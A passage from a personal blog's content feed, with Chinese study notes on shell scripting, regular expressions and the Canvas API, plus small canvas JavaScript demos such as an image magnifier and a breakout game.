class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">case 值 in</span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">*) #其他</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>Eg.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    echo -n &quot;输入 1 到 5 之间的数字:&quot;</span><br><span class="line">    read aNum</span><br><span class="line">    case $aNum in</span><br><span class="line">        1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *) echo &quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;</span><br><span class="line">            break</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>跳出循环</p><p><code>break</code></p><p><code>continue</code></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[ function ] funname [()]</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    action;</span><br><span class="line"></span><br><span class="line">    [return int;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以带function fun() 定义，也可以直接fun() 定义,不带任何参数。<br>参数返回，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。 return后跟数值n(0-255)<br>函数返回值在调用该函数后通过 <code>$?</code> 来获得。<br>必须使用前定义<br>在Shell中，调用函数时可以向其传递参数。在函数体内部，通过 <code>$n</code> 的形式来获取参数的值，例如，<code>$1</code>表示第一个参数，<code>$2</code>表示第二个参数…<br>参数总数 <code>$#</code><br>作为一个字符串输出所有参数 <code>$*</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">参数处理</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>$#</code></td><td style="text-align:center">传递到脚本的参数个数</td></tr><tr><td style="text-align:center"><code>$*</code></td><td style="text-align:center">以一个单字符串显示所有向脚本传递的参数</td></tr><tr><td style="text-align:center">$$$$</td><td style="text-align:center">脚本运行的当前进程ID号</td></tr><tr><td style="text-align:center"><code>$!</code></td><td style="text-align:center">后台运行的最后一个进程的ID号</td></tr><tr><td style="text-align:center"><code>$@</code></td><td style="text-align:center">与<code>$*</code>相同，但是使用时加引号，并在引号中返回每个参数。</td></tr><tr><td style="text-align:center"><code>$-</code></td><td style="text-align:center">显示Shell使用的当前选项，与set命令功能相同。</td></tr><tr><td style="text-align:center"><code>$?</code></td><td style="text-align:center">显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table></div><h2 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h2><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">command &gt; file</td><td style="text-align:center">将输出重定向到 file。</td></tr><tr><td style="text-align:center">command &lt; file</td><td style="text-align:center">将输入重定向到 file。</td></tr><tr><td style="text-align:center">command &gt;&gt; file</td><td style="text-align:center">将输出以追加的方式重定向到 file。</td></tr><tr><td style="text-align:center">n &gt; file</td><td style="text-align:center">将文件描述符为 n 的文件重定向到 file。</td></tr><tr><td style="text-align:center">n &gt;&gt; file</td><td style="text-align:center">将文件描述符为 n 的文件以追加的方式重定向到 file。</td></tr><tr><td style="text-align:center">n &gt;&amp; m</td><td style="text-align:center">将输出文件 m 和 n 合并。</td></tr><tr><td style="text-align:center">n &lt;&amp; m</td><td style="text-align:center">将输入文件 m 和 n 合并。</td></tr><tr><td style="text-align:center">&lt;&lt; tag</td><td style="text-align:center">将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td></tr></tbody></table></div><p>Here Document<br>Here Document 是 Shell 中的一种特殊的重定向方式，用来将输入重定向到一个交互式 Shell 脚本或程序。</p><p>它的基本的形式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command &lt;&lt; delimiter</span><br><span class="line">    document</span><br><span class="line">delimiter</span><br></pre></td></tr></table></figure><p>它的作用是将两个 delimiter 之间的内容(document) 作为输入传递给 command。</p><p><code>/dev/null</code> 文件<br>如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 <code>/dev/null</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ command &gt; /dev/null</span><br></pre></td></tr></table></figure><p><code>/dev/null</code> 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 <code>/dev/null</code>文件非常有用，将命令的输出重定向到它，会起到”禁止输出”的效果。</p><p>如果希望屏蔽 stdout 和 stderr，可以这样写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ command &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="Shell-文件包含"><a href="#Shell-文件包含" class="headerlink" title="Shell 文件包含"></a>Shell 文件包含</h2><p>和其他语言一样，Shell 也可以包含外部脚本。这样可以很方便的封装一些公用的代码作为一个独立的文件。</p><p>Shell 文件包含的语法格式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">. filename   # 注意点号(.)和文件名中间有一空格</span><br><span class="line">或</span><br><span class="line">source filename</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式笔记</title>
      <link href="/blog/note-zzbds/"/>
      <url>/blog/note-zzbds/</url>
      
        <content type="html"><![CDATA[<p>转义字符</p><div class="table-container"><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>\cx</code></td><td style="text-align:center">匹配由x指明的控制字符。例如， <code>\cM</code> 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符</td></tr><tr><td style="text-align:center"><code>\f</code></td><td style="text-align:center">匹配一个换页符。等价于 <code>\x0c</code> 和 <code>\cL</code></td></tr><tr><td style="text-align:center"><code>\n</code></td><td style="text-align:center">匹配一个换行符。等价于 <code>\x0a</code> 和 <code>\cJ</code></td></tr><tr><td style="text-align:center"><code>\r</code></td><td style="text-align:center">匹配一个回车符。等价于 <code>\x0d</code> 和 <code>\cM</code></td></tr><tr><td style="text-align:center"><code>\s</code></td><td style="text-align:center">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 <code>[ \f\n\r\t\v]</code>。注意 Unicode 正则表达式会匹配全角空格符</td></tr><tr><td style="text-align:center"><code>\S</code></td><td style="text-align:center">匹配任何非空白字符。等价于 <code>[^ \f\n\r\t\v]</code></td></tr><tr><td style="text-align:center"><code>\t</code></td><td style="text-align:center">匹配一个制表符。等价于 <code>\x09</code> 和 <code>\cI</code></td></tr><tr><td style="text-align:center"><code>\v</code></td><td style="text-align:center">匹配一个垂直制表符。等价于 <code>\x0b</code> 和 <code>\cK</code></td></tr></tbody></table></div><p>特殊字符</p><div class="table-container"><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">$</td><td style="text-align:center">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 <code>&#39;\n&#39;</code> 或 <code>&#39;\r&#39;</code>。要匹配 <code>$</code> 字符本身，请使用 <code>\</code>$</td></tr><tr><td style="text-align:center"><code>( )</code></td><td style="text-align:center">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 <code>\(</code> 和 <code>\)</code></td></tr><tr><td style="text-align:center"><code>*</code></td><td style="text-align:center">匹配前面的子表达式零次或多次。要匹配 <code>*</code> 字符，请使用 <code>\*</code></td></tr><tr><td style="text-align:center"><code>+</code></td><td style="text-align:center">匹配前面的子表达式一次或多次。要匹配 <code>+</code> 字符，请使用 <code>\+</code></td></tr><tr><td style="text-align:center"><code>.</code></td><td style="text-align:center">匹配除换行符 <code>\n</code>之外的任何单字符。要匹配 <code>.</code> ，请使用 <code>\.</code></td></tr><tr><td style="text-align:center"><code>[</code></td><td style="text-align:center">标记一个中括号表达式的开始。要匹配 <code>[</code>，请使用 <code>\[</code></td></tr><tr><td style="text-align:center"><code>?</code></td><td style="text-align:center">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 <code>?</code> 字符，请使用 <code>\?</code></td></tr><tr><td style="text-align:center"><code>\</code></td><td style="text-align:center">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。<code>&#39;\n&#39;</code> 匹配换行符。序列 <code>&#39;\\&#39;</code> 匹配 <code>&quot;\&quot;</code>，而 <code>&#39;\(&#39;</code> 则匹配 <code>&quot;(&quot;</code></td></tr><tr><td style="text-align:center"><code>^</code></td><td style="text-align:center">匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 <code>^</code> 字符本身，请使用 <code>\^</code></td></tr><tr><td style="text-align:center"><code>{</code></td><td style="text-align:center">标记限定符表达式的开始。要匹配 <code>{</code>，请使用 <code>\{</code></td></tr><tr><td style="text-align:center">&#124;</td><td style="text-align:center">指明两项之间的一个选择。要匹配 &#124;，请使用 <code>\</code>&#124;</td></tr></tbody></table></div><p>限制符</p><div class="table-container"><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>*</code></td><td style="text-align:center">匹配前面的子表达式零次或多次。例如，<code>zo*</code> 能匹配 <code>&quot;z&quot;</code> 以及 <code>&quot;zoo&quot;</code>。<code>*</code> 等价于<code>{0,}</code></td></tr><tr><td style="text-align:center"><code>+</code></td><td style="text-align:center">匹配前面的子表达式一次或多次。例如，<code>&#39;zo+&#39;</code> 能匹配 <code>&quot;zo&quot;</code> 以及 <code>&quot;zoo&quot;</code>，但不能匹配 <code>&quot;z&quot;</code>。+ 等价于 <code>{1,}</code>。</td></tr><tr><td style="text-align:center"><code>?</code></td><td style="text-align:center">匹配前面的子表达式零次或一次。例如，<code>&quot;do(es)?&quot;</code> 可以匹配 <code>&quot;do&quot;</code> 、 <code>&quot;does&quot;</code> 中的 <code>&quot;does&quot;</code> 、 <code>&quot;doxy&quot;</code> 中的 <code>&quot;do&quot;</code> 。<code>?</code> 等价于 <code>{0,1}</code></td></tr><tr><td style="text-align:center"><code>{n}</code></td><td style="text-align:center"><code>n</code> 是一个非负整数。匹配确定的 n 次。例如，<code>&#39;o{2}&#39;</code> 不能匹配 <code>&quot;Bob&quot;</code> 中的 <code>&#39;o&#39;</code>，但是能匹配 <code>&quot;food&quot;</code> 中的两个 o</td></tr><tr><td style="text-align:center"><code>{n,}</code></td><td style="text-align:center"><code>n</code> 是一个非负整数。至少匹配 n 次。例如，<code>&#39;o{2,}&#39;</code> 不能匹配 <code>&quot;Bob&quot;</code> 中的 <code>&#39;o&#39;</code>，但能匹配 <code>&quot;foooood&quot;</code> 中的所有 o。<code>&#39;o{1,}&#39;</code> 等价于 <code>&#39;o+&#39;</code>。<code>&#39;o{0,}&#39;</code> 则等价于 <code>&#39;o*&#39;</code></td></tr><tr><td style="text-align:center"><code>{n,m}</code></td><td style="text-align:center">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，<code>&quot;o{1,3}&quot;</code> 将匹配 <code>&quot;fooooood&quot;</code> 中的前三个 o。<code>&#39;o{0,1}&#39;</code> 等价于 <code>&#39;o?&#39;</code>。请注意在逗号和两个数之间不能有空格</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> regex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>imagemagnifier</title>
      <link href="/blog/js-imagemagnifier/"/>
      <url>/blog/js-imagemagnifier/</url>
      
        <content type="html"><![CDATA[<canvas id="cnv1" width="200" height="200"></canvas><canvas id="cnv2" width="100" height="100"></canvas><script type="text/javascript">    cnv1 = document.getElementById('cnv1');    ctx1 = cnv1.getContext('2d');    cnv2 = document.getElementById('cnv2');    ctx2 = cnv2.getContext('2d');    var img = new Image();    img.src = '/img/201812021851.png';    var zm = function(e) {        ctx1.drawImage(img, 0, 0);        var x = event.layerX;        var y = event.layerY;        ctx2.drawImage(cnv1, Math.abs(x-5), Math.abs(y-5), 10, 10, 0, 0, 100, 100);    }    cnv1.addEventListener('mousemove', zm);</script>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> canvas </tag>
            
            <tag> image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Breakoutv0.0.1</title>
      <link href="/blog/js-Breakoutv0.0.1/"/>
      <url>/blog/js-Breakoutv0.0.1/</url>
      
        <content type="html"><![CDATA[<p><canvas id="cnv1" width="300" height="600"></canvas></p><script type="text/javascript">    var cnv = document.getElementById("cnv1");    var ctx = cnv.getContext('2d');    var start = false;    var raf;    var vv = 5;    var over = false;    var ball = {        x: 150,        y: 600-5-8, //change        vx: 0,        vy: vv,        r: 8,        col: "black",        draw: function() {            ctx.save();            ctx.beginPath();            ctx.arc(this.x, this.y, this.r, 0, 2*Math.PI, false);            ctx.closePath();            ctx.fillStyle = this.col;            ctx.fill();            ctx.restore();        },        rset: function() {            this.x = 150,            this.y = 600-5-8; //change        }    }    var block = {        x: 150,        y: 600,        h: 5,        w: 60,        col: "black",        draw: function() {            ctx.save();            ctx.fillStyle = this.col;            ctx.fillRect(this.x-this.w/2, this.y-this.h, this.w, this.h);            ctx.restore();        },        rset: function() {            this.x = 150,            this.y = 600;        }    }    var line = {        x1: 150,        y1: ball.y,        x2: 0,        y2: 0,        length: 80,        width: 3,        ang: 0,        col: "red",        rot: function(x, y) {            dx = x-this.x1;            dy = Math.max(0, this.y1-y);            this.ang = Math.atan(dy/dx);            if(this.ang < 0) this.ang += Math.PI;            this.x2 = 150+this.length*Math.cos(this.ang);            this.y2 = this.y1-this.length*Math.sin(this.ang);        },        draw: function() {            ctx.save();            ctx.lineWidth = this.width;            ctx.strokeStyle = this.col;            ctx.beginPath();            ctx.moveTo(this.x1, this.y1);            ctx.lineTo(this.x2, this.y2);            ctx.stroke();            ctx.restore();        }    }    ball.move = function() {        if(!start) return;        this.x += this.vx;        this.y += this.vy;        if(this.x-this.r < 0) {            this.x = this.r-this.x;            this.vx = -this.vx;        }        if(this.x+this.r > 300) {            this.x = 600-(this.x+this.r);            this.vx = -this.vx;        }        if(this.y-this.r < 0) {            this.y = this.r-this.y;            this.vy = -this.vy;        }        if(this.y+this.r > 600-block.h) {            if(ball.x-5 > block.x+block.w/2 || ball.x+5 < block.x-block.w/2) {                over = true;                return;            }            this.y = 2*(600-block.h)-(this.y+this.r);            this.vy = -this.vy;        }    }    function clear() {        ctx.clearRect(0, 0, 300, 600);    }    function rset() {        clear();        start = false;        over = false;        ball.rset();        block.rset();    }    function move() {        clear();        ball.move();        ball.draw();        block.draw();        if(over) {            rset();            window.cancelAnimationFrame(raf);            return;        }        raf = window.requestAnimationFrame(move);    }    cnv.addEventListener("mousemove", function(e) {        if(!start) {            clear();            ball.draw();            block.draw();            line.rot(e.clientX, e.clientY);            line.draw();        } else {            block.x = e.clientX;        }    });/*    cnv.addEventListener("mouseover", function(e) {    });    cnv.addEventListener("mouseout", function(e) {    });*/    cnv.addEventListener("click", function(e) {        if(!start) {            start = true;            over = false;            ball.vx = vv*Math.cos(line.ang);            ball.vy = vv*Math.sin(line.ang);            raf = window.requestAnimationFrame(move);        }    });</script>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> canvas </tag>
            
            <tag> game </tag>
            
            <tag> breakout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AddBall2</title>
      <link href="/blog/js-addball2/"/>
      <url>/blog/js-addball2/</url>
      
        <content type="html"><![CDATA[<p>点击释放小球，再次点击可以开关尾部踪迹，因为blog的原因可能兼容不好…<br>没有鼠标悬停的动画</p><canvas id="cnv1" width="500" height="350"></canvas><script type="text/javascript">    cnv = document.getElementById('cnv1');    ctx = cnv.getContext('2d');    var raf;    var running = false;    var tail = false;    var ball = {        x: 0,        y: 0,        vx: 5,        vy: 5,        r: 10,        col: "red",        draw: function() {            ctx.save();            ctx.beginPath();            ctx.arc(this.x, this.y, this.r, 0, 2*Math.PI, false);            ctx.closePath();            ctx.fillStyle = this.col;            ctx.fill();            ctx.restore();        }    }    function clear() {        if(tail) {            ctx.fillStyle = "rgba(255, 255, 255, 0.3)";            ctx.fillRect(0, 0, 500, 350);        } else {            ctx.clearRect(0, 0, 500, 350);        }    }    function move() {        clear();        ball.draw();        ball.x += ball.vx;        ball.y += ball.vy;        if(ball.x-ball.r < 0) ball.x = ball.r-ball.x, ball.vx = -ball.vx;        if(ball.x+ball.r > 500) ball.x = 1000-(ball.x+ball.r), ball.vx = -ball.vx;        if(ball.y-ball.r < 0) ball.y = ball.r-ball.y, ball.vy = -ball.vy;        if(ball.y+ball.r > 350) ball.y = 700-(ball.y+ball.r), ball.vy = -ball.vy;        raf = window.requestAnimationFrame(move);    }    cnv.addEventListener("mousemove", function(e) {        if(!running) {            clear();            ball.x = e.clientX;            ball.y = e.clientY;            ball.draw();        }    });    cnv.addEventListener("click", function(e) {        if(!running) {            running = true;            raf = window.requestAnimationFrame(move);        } else {            tail = !tail;        }    });    cnv.addEventListener("mouseover", function(e) {        if(running) {            raf = window.requestAnimationFrame(move);        }    });    cnv.addEventListener("mouseout", function(e) {        window.cancelAnimationFrame(raf);    });</script>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> canvas </tag>
            
            <tag> game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈哈哈哈哈哈哈</title>
      <link href="/blog/test-Haha/"/>
      <url>/blog/test-Haha/</url>
      
        <content type="html"><![CDATA[<p>哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈<br>哈哈哈哈哈哈哈<br>哈哈哈哈哈哈哈<br>哈哈哈哈哈哈哈<br>哈哈哈哈哈哈哈<br>哈哈哈哈哈哈哈<br>哈哈哈哈哈哈哈<br>哈哈哈哈哈哈哈<br>哈哈哈哈哈哈哈</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Canvas笔记</title>
      <link href="/blog/note-canvas/"/>
      <url>/blog/note-canvas/</url>
      
        <content type="html"><![CDATA[<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial" target="_blank" rel="noopener">Tutorial</a></p><h2 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h2><p>default size:300px * 150px</p><p>not using CSS</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">""</span> <span class="attr">height</span>=<span class="string">""</span>&gt;</span> <span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br></pre></td></tr></table></figure><p>渲染上下文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var canvas = document.getElementById(&apos;id&apos;);</span><br><span class="line">var ctx = canvas.getContext(&apos;2d&apos;);</span><br></pre></td></tr></table></figure><p>检查支持性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var canvas = document.getElementById(&apos;tutorial&apos;);</span><br><span class="line"></span><br><span class="line">if (canvas.getContext)&#123;</span><br><span class="line">  var ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">  // drawing code here</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  // canvas-unsupported code here</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h2><h3 id="栅格"><a href="#栅格" class="headerlink" title="栅格"></a>栅格</h3><p>网格是左上角为(0,0)，向右为x正方向，向下为y正方向</p><h3 id="绘制矩形"><a href="#绘制矩形" class="headerlink" title="绘制矩形"></a>绘制矩形</h3><p>(x,y)为矩形左上角坐标</p><p><code>fillRect(x, y, width, height)</code><br>绘制填充矩形</p><p><code>storkeRect(x, y, width, height)</code><br>绘制矩形边框</p><p><code>clearRect(x, y, width, height)</code><br>清除指定矩形区域，让清除部分完全透明</p><h3 id="绘制路径"><a href="#绘制路径" class="headerlink" title="绘制路径"></a>绘制路径</h3><p><code>beginPath()</code><br>新建一条路径</p><p><code>closePath()</code><br>闭合路径</p><p><code>stroke()</code><br>绘制图形轮廓</p><p><code>fill()</code><br>填充区域</p><p>注意：当前路径为空，即调用beginPath()之后，或者canvas刚建的时候，第一条路径构造命令通常被视为是moveTo()，无论实际上是什么。出于这个原因，你几乎总是要在设置路径之后专门指定你的起始位置。</p><p>注意：当你调用fill()函数时，所有没有闭合的形状都会自动闭合，所以你不需要调用closePath()函数。但是调用stroke()时不会自动闭合。</p><h3 id="移动笔触"><a href="#移动笔触" class="headerlink" title="移动笔触"></a>移动笔触</h3><p><code>moveTo(x, y)</code><br>将笔触移动到指定坐标</p><p>如果没有moveTo()会变成一条连续的线</p><h3 id="线"><a href="#线" class="headerlink" title="线"></a>线</h3><p><code>lineTo(x, y)</code><br>绘制一条从当前位置到指定坐标的线</p><h3 id="圆弧"><a href="#圆弧" class="headerlink" title="圆弧"></a>圆弧</h3><p><code>arc(x, y, radius, startAngle, endAngle, anticlockwise)</code><br>画一个以（x,y）为圆心的以radius为半径的圆弧（圆），从startAngle开始到endAngle结束，按照anticlockwise给定的方向（默认为顺时针）来生成。<br>参数anticlockwise为一个布尔值。为true时，是逆时针方向，否则顺时针方向。</p><p><code>arcTo(x1, y1, x2, y2, radius)</code><br>根据给定的控制点和半径画一段圆弧，再以直线连接两个控制点。</p><p>注意：arc()函数中表示角的单位是弧度，不是角度。角度与弧度的js表达式:弧度=(Math.PI/180) * 角度。</p><h3 id="二次贝塞尔曲线及三次贝塞尔曲线"><a href="#二次贝塞尔曲线及三次贝塞尔曲线" class="headerlink" 